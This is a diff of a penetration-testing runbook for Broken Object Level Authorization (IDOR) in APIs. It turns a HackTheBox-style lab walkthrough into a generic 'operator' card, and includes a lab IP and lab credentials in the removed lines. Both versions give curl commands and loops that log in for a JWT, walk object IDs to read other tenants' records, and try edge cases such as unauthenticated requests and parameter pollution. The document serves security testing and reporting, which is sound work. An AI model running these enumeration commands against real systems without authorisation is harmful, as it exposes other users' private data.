@@ -1,261 +1,203 @@
-# Batch 01 — BOLA / IDOR (Broken Object Level Authorization)
+# Batch 01 — BOLA / IDOR (operator)
 
-## FILL IN
+## FILL IN (any API)
 
 ```bash
-BASE="http://154.57.164.65:31687"   # change per spawn
-EMAIL="htbpentester1@pentestercompany.com"
-PASS="HTBPentester1"
-# after login:
-# JWT="eyJ..."
+BASE="https://api.example.com"
+LOGIN_PATH="/api/v1/authentication/.../sign-in"   # from OAS
+EMAIL="user-a@example.com"
+PASS="..."
+# Discover from OAS — any path with {id}, {ID}, {uuid}, {userId}
+OBJECT_PATH="/api/v1/.../resource"                 # without id
+OBJECT_BY_ID="$OBJECT_PATH/\$ID"                   # pattern
+OWNER_FIELD="companyID"                            # or userId, accountId, customerID
+MY_OWNER=""                                        # fill after baseline
 ```
 
 ## GOAL
-Prove you can read **other tenants’ objects** by changing an ID, while logged in as a low-privilege user (Supplier).
-
-> **Not Broken Auth** (you use a valid JWT). **Not BFLA** (function may be allowed). **Not BOPLA** (wrong *object*, not extra *fields*).  
-> See [00-authz-authn-compare.md](./00-authz-authn-compare.md) for evidence comment templates.
+As **authenticated user A**, access objects that belong to **user/tenant B** by changing an object identifier.
 
 ## TIME
-45–90 min
+45–90 min per API surface
 
 ## YOU NEED
-- Target up + Swagger (or OpenAPI)
-- `curl` (and optionally pinchtab + gori)
-- Authorized lab only
+- Two accounts same role (A, B) **or** A + leaked/guessable ids  
+- OpenAPI/Swagger or traffic map  
+- curl / gori / Burp  
 
 ---
 
-## WHY (30 seconds)
-
-APIs often do:
+## WHY (first principles)
 
 ```text
-GET /resource/{id}  →  return row WHERE id = {id}
+GET /resource/{id}  →  SELECT * WHERE id = {id}
 ```
 
-They check **“is this user logged in?”** but not **“does this row belong to this user/company?”**
+Server checks “logged in?” but not “does this row belong to this principal?”
 
-That is **BOLA** (OWASP) / **IDOR** / **CWE-639 Authorization Bypass Through User-Controlled Key**.
+| Name | Same bug |
+|------|----------|
+| BOLA | OWASP API1:2023 |
+| IDOR | classic web name |
+| CWE-639 | Authorization Bypass Through User-Controlled Key |
 
-**IDs can be:**
+**IDs:** integers (walk), UUIDs (leak from other endpoints), hashes, filenames.
 
-| Type | Example |
-|------|---------|
-| Integer | `1`, `13` (easy to walk) |
-| UUID/GUID | `b75a7c76-e149-4ca7-…` (harder, still leakable) |
+Role may grant the **function** (`GetById`) while still missing **ownership**. That is BOLA, not BFLA.
 
-Academy lesson: role grants *function* (`GetYearlyReportByID`) but not *object ownership*.
+Compare classes: [00-authz-authn-compare.md](./00-authz-authn-compare.md)
 
 ---
 
-## DO THIS
+## DO THIS (generic operator path)
 
-### 1) Map the API (Swagger)
+### 1) Inventory object endpoints
 
 ```bash
-# Browser / pinchtab
-# $BASE/swagger/index.html
+# From OAS
+curl -sk -o openapi.json "$BASE/swagger/v1/swagger.json"   # or /openapi.json
+grep -oE '"/[^"]*\{[^}]+\}[^"]*"' openapi.json | sort -u
 
-curl -sk -o swagger.json "$BASE/swagger/v1/swagger.json"
-grep -o '"\/api[^"]*"' swagger.json | sort -u | head -50
+# Or from gori/Burp history: paths containing /orders/ /users/ /reports/ etc.
 ```
 
-**pinchtab**
+**pinchtab:** open Swagger UI, screenshot, use Authorize if needed.
 
 ```bash
 export PINCHTAB_SESSION=$(pinchtab session create --agent-id api-bola)
 pinchtab nav "$BASE/swagger/index.html" --snap
-pinchtab screenshot -o swagger-ui.png
+pinchtab screenshot -o evidence/swagger-ui.png
 ```
 
-**gori** (optional): start proxy, set browser through gori, click Swagger “Try it out” so every call is in history for ID replay.
-
-### 2) Login as Supplier → JWT
+### 2) Authenticate as user A
 
 ```bash
-curl -sk -X POST "$BASE/api/v1/authentication/suppliers/sign-in" \
-  -H 'accept: application/json' \
+# Shape varies — JSON email/password is common
+curl -sk -X POST "$BASE$LOGIN_PATH" \
   -H 'Content-Type: application/json' \
-  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}"
+  -d "{\"Email\":\"$EMAIL\",\"Password\":\"$PASS\"}"
+# or Email/email, Password/password — match OAS
+
+JWT=$( ... extract access_token / jwt from response ... )
 ```
 
-Copy `jwt` from JSON:
+### 3) Baseline: who am I / what do I own?
 
 ```bash
-JWT=$(curl -sk -X POST "$BASE/api/v1/authentication/suppliers/sign-in" \
-  -H 'Content-Type: application/json' \
-  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" \
-  | python3 -c 'import sys,json; print(json.load(sys.stdin)["jwt"])')
-echo "JWT length: ${#JWT}"
+# Typical patterns — pick what exists in OAS
+curl -sk -H "Authorization: Bearer $JWT" "$BASE/api/v1/.../current-user"
+curl -sk -H "Authorization: Bearer $JWT" "$BASE/api/v1/.../roles/current-user"
 ```
 
-Swagger UI: **Authorize** → `Bearer <jwt>` → lock closes.
-
-### 3) Establish *your* object baseline
-
-```bash
-# Who am I?
-curl -sk -H "Authorization: Bearer $JWT" -H 'accept: application/json' \
-  "$BASE/api/v1/suppliers/current-user"
-
-# My company (Guid)
-curl -sk -H "Authorization: Bearer $JWT" -H 'accept: application/json' \
-  "$BASE/api/v1/supplier-companies/current-user"
-
-# My roles (function-level grants)
-curl -sk -H "Authorization: Bearer $JWT" -H 'accept: application/json' \
-  "$BASE/api/v1/roles/current-user"
-```
-
-**Write down:**
+Write:
 
 ```text
-my_company_id=
+my_user_id=
+my_owner_id=     # company/tenant
 my_roles=
+my_object_ids=   # create one object if needed
 ```
 
-Lab expected role: `SupplierCompanies_GetYearlyReportByID`  
-Lab expected company: `b75a7c76-e149-4ca7-9c55-d9fc4ffa87be` (may change per spawn)
-
-### 4) Hit the object endpoint (integer ID)
+### 4) Access object by id (horizontal)
 
 ```bash
-# Academy vulnerable shape
+# Use B's id, sequential ints, or ids from list endpoints
+ID=1
 curl -sk -H "Authorization: Bearer $JWT" -H 'accept: application/json' \
-  "$BASE/api/v1/supplier-companies/yearly-reports/1"
+  "$BASE/api/v1/.../resource/$ID"
 ```
 
-**BOLA if:** `companyID` in the report **≠** `my_company_id`.
+**BOLA if:** response `OWNER_FIELD` ≠ `my_owner_id` (or data clearly B’s).
 
-### 5) Mass-abuse loop (academy pattern)
+### 5) Mass walk (integers) / batch of UUIDs
 
 ```bash
-for ((i=1; i<=20; i++)); do
-  curl -s -w "\n" -X GET \
-    "$BASE/api/v1/supplier-companies/yearly-reports/$i" \
-    -H 'accept: application/json' \
-    -H "Authorization: Bearer $JWT"
+for ((i=1; i<=50; i++)); do
+  curl -s -w "\n" -H "Authorization: Bearer $JWT" \
+    "$BASE/api/v1/.../resource/$i"
 done
 ```
 
-Pretty (if `jq` installed):
+### 6) Second account proof (best evidence)
 
-```bash
-for ((i=1; i<=20; i++)); do
-  curl -s -w "\n" -X GET \
-    "$BASE/api/v1/supplier-companies/yearly-reports/$i" \
-    -H 'accept: application/json' \
-    -H "Authorization: Bearer $JWT" | python3 -m json.tool
-done
+```text
+1) As A create object → note id
+2) As B GET/PUT/DELETE that id
+3) Or as A GET B's id from B's session traffic
 ```
 
-### 6) Confirm ownership mismatch (one-liner)
-
-```bash
-MY=b75a7c76-e149-4ca7-9c55-d9fc4ffa87be   # paste yours
-for i in 1 2 3 13; do
-  body=$(curl -s -H "Authorization: Bearer $JWT" \
-    "$BASE/api/v1/supplier-companies/yearly-reports/$i")
-  echo "$i $body" | python3 -c "import sys,json,re; s=sys.stdin.read();
-i,s=s.split(' ',1); o=json.loads(s); r=o.get('supplierCompanyYearlyReport',o);
-print(i, 'OTHER' if r.get('companyID')!='''$MY''' else 'MINE', r.get('companyID'), r.get('revenue'))"
-done
-```
-
-### 7) Write 3 lines
+### 7) Operator log
 
 ```text
 BOLA: yes/no
 endpoint:
-other_company_ids_seen:
+ids_proven:
+impact:
 ```
 
 ---
 
-## EDGE CASES (real world — beyond Academy)
+## EDGE CASES (always run)
 
-Do these **after** the basic walk. They catch “fixed for id=1 only” and inventory bugs.
-
-| # | Test | Why |
-|---|------|-----|
-| E1 | **No auth** on same URL | Should be 401 — if 200, broken auth not just BOLA |
-| E2 | **Bad / none JWT** | 401 expected |
-| E3 | IDs `0`, `-1`, big `99999` | Error shape vs data; oracle for existence |
-| E4 | **Sequential range** 1…N until “not found” | Full dump size |
-| E5 | **UUID in integer slot** | 404 vs 500 (error handling) |
-| E6 | **List endpoint** without `{ID}` | Often 403 (BFLA) while `{ID}` is BOLA — still note |
-| E7 | **Other ID params** in Swagger (`orders/{ID}`, `customers/{ID}`, products) | Same class, more impact |
-| E8 | **Create object as A, access as B** (if two accounts) | Classic IDOR proof |
-| E9 | **Change method** PUT/DELETE on object | BOLA write/delete |
-| E10 | **Encode / HPP** `id=1&id=2`, `id[]=` | Parser confusion |
-| E11 | **Horizontal vs vertical** | Same role other tenant vs escalate to admin objects |
-| E12 | **Predictable GUIDs** (timestamp, sequential) | When ints are fixed |
-| E13 | **Export / report / PDF / photo** by ID | Files often weaker than JSON |
-| E14 | **GraphQL** `node(id:)` / relay global IDs | Same BOLA idea |
-| E15 | **gori/Burp match-replace** on path ID while browsing Swagger | Fast manual fuzz |
-
-### Edge-case paste kit
+| # | Test |
+|---|------|
+| E1 | No auth on same URL → 401? |
+| E2 | Bad token |
+| E3 | id `0` `-1` huge / random UUID |
+| E4 | Sequential range until empty |
+| E5 | List collection 403 vs item 200 |
+| E6 | PUT/PATCH/DELETE on object |
+| E7 | All `{id}` params in OAS (not one path) |
+| E8 | Create A → access B |
+| E9 | HPP `id=1&id=2` |
+| E10 | GraphQL `node(id:)` |
+| E11 | Files: `/download?id=` PDF/photo |
+| E12 | gori/Burp match-replace on id while using UI |
 
 ```bash
-# E1 no auth
-curl -sk -o /dev/null -w "%{http_code}\n" \
-  "$BASE/api/v1/supplier-companies/yearly-reports/1"
-
-# E3 weird ids
-for i in 0 -1 99999; do
-  echo -n "id=$i "
-  curl -sk -H "Authorization: Bearer $JWT" \
-    "$BASE/api/v1/supplier-companies/yearly-reports/$i"
-  echo
-done
-
-# E6 list vs item
-curl -sk -o /dev/null -w "list:%{http_code}\n" -H "Authorization: Bearer $JWT" \
-  "$BASE/api/v1/supplier-companies/yearly-reports"
-curl -sk -o /dev/null -w "item:%{http_code}\n" -H "Authorization: Bearer $JWT" \
-  "$BASE/api/v1/supplier-companies/yearly-reports/1"
+curl -sk -o /dev/null -w "noauth:%{http_code}\n" "$BASE/api/v1/.../resource/1"
+curl -sk -o /dev/null -w "list:%{http_code}\n" -H "Authorization: Bearer $JWT" "$BASE/api/v1/.../resource"
+curl -sk -o /dev/null -w "item:%{http_code}\n" -H "Authorization: Bearer $JWT" "$BASE/api/v1/.../resource/1"
 ```
 
-### Lab results (154.57.164.65:31687 — Aug 2026)
-
-| Check | Result |
-|-------|--------|
-| Login Supplier | OK → JWT HS512, role `SupplierCompanies_GetYearlyReportByID` |
-| Own company | `b75a7c76-e149-4ca7-9c55-d9fc4ffa87be` |
-| `yearly-reports/1` | **200** company `f9e58492-…` ≠ own → **BOLA** |
-| `yearly-reports/13` | **200** other company revenue + C-level comments |
-| Mass 1–20 | IDs **1–18** return reports; 19+ “not found” |
-| No auth | **401** |
-| List `/yearly-reports` | **403** (function OK for by-ID only) |
-| Company by GUID | **403** with this role |
-| Evidence | `notes/inlanefreight-bola/evidence/` |
-
 ---
 
-## Prevention (for reports)
+## Evidence comment (paste into ticket)
 
-Server must compare **resource.owner / companyID** to **authenticated principal** on every object access. Role alone is not enough. Deny if mismatch.
+```text
+Class: BOLA / IDOR (API1 / CWE-639).
+Authenticated as owner X; GET {endpoint}/{id} returned owner Y ≠ X.
+Not BFLA: function may be allowed; object ownership check failed.
+Not BOPLA: issue is wrong object, not extra fields on our own object.
+Evidence: baseline identity; sample response; id list / loop.
+```
 
----
+## Prevention
+
+Compare resource owner to authenticated principal on **every** object access. Role alone is insufficient.
 
 ## IF / THEN
 
-| You see | You do |
-|---------|--------|
-| Other tenant data | Report BOLA + sample IDs + impact (revenue, PII) |
-| Only own company | Try other endpoints / second account |
-| 401 without token, 200 with any ID | Classic academy BOLA |
-| 403 on all IDs | Need different role or auth bypass first |
+| See | Do |
+|-----|-----|
+| Other tenant data | Report BOLA + impact |
+| Only own objects | Next `{id}` path / second account |
+| 403 all ids | Need other role or BFLA/auth path first |
+
+## NEXT
+→ [02-broken-authentication.md](./02-broken-authentication.md)  
+→ Re-run this card on **every** object id in OAS
 
 ---
 
-## NEXT
-Later batches (auth, BOPLA, BFLA, SSRF, …) when added.  
-For now: re-run this card on **every** `{ID}` path in Swagger.
+## WORKED EXAMPLE (lab only — not the runbook)
 
-## OWASP / CWE
+Optional Inlanefreight academy shape. Full proof: `../notes/inlanefreight-bola/`.
 
-- API1:2023 Broken Object Level Authorization  
-- CWE-639 Authorization Bypass Through User-Controlled Key  
-- Also called IDOR
+| Item | Example value |
+|------|----------------|
+| Login | `POST /api/v1/authentication/suppliers/sign-in` |
+| Object | `GET /api/v1/supplier-companies/yearly-reports/{ID}` |
+| Baseline | `.../supplier-companies/current-user` |
+| BOLA | id 1..18 → other `companyID` |
+| Evidence | `notes/inlanefreight-bola/evidence/` |
